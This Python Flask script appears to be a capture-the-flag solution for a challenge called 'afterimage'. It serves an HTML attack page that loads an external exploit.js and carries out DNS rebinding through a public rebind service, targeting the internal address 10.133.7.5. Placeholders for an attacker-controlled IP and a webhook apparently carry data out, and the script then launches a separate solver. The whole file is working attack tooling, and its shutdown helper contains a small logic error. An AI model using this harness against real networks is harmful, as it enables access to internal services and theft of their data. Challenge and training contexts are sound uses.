from flask import Flask, request, Response
import threading
import sys
import os
import string
import random
app = Flask(__name__)

HTML_TEMPLATE = """<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>afterimage solve</title>
  </head>
  <body>
    <script>
      setTimeout(function(){
        __SCRIPT__
      }, 10);
    </script>
  </body>
</html>
"""
# Using http://dnsrebindtool.43z.one/ as a DNS resolver,
## but there are many available online

# http://dnsrebindtool.43z.one/ expects a list of 
# <randomstring>.<first_ip>.<second_ip>.rebind.43z.one
# where IPs are divided by a middle dash like 255-255-255-255

IP = ""  # controlled IP address
TARGET = "10-133-7-5"
BASE_DOMAIN = f'{IP}.{TARGET}.rebind.43z.one'
randomstring = ''.join(random.choices(string.ascii_lowercase+string.digits, k=9))
DOMAIN = f'{randomstring}.{BASE_DOMAIN}'
print(f"attack domain: {DOMAIN}")
WEBHOOK = ""


# load SCRIPT from file
with open("exploit.js", "r") as f:
    SCRIPT = f.read()

def shutdown_server():
    func = request.environ.get("werkzeug.server.shutdown")
    if func is None:
        sys.exit(0)
        func()


@app.route("/attack")
def attack():

    html = HTML_TEMPLATE.replace("__SCRIPT__", SCRIPT)
    html = html.replace("__DOMAIN__", DOMAIN)
    html = html.replace("__WEBHOOK__", WEBHOOK)
    threading.Timer(2, lambda: os._exit(0)).start()
    return Response(
        html,
        status=200,
        mimetype="text/html"
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=True)
    # solve the other half of the challenge and reports to the bot
    os.system(f"python3 solver.py {DOMAIN}")
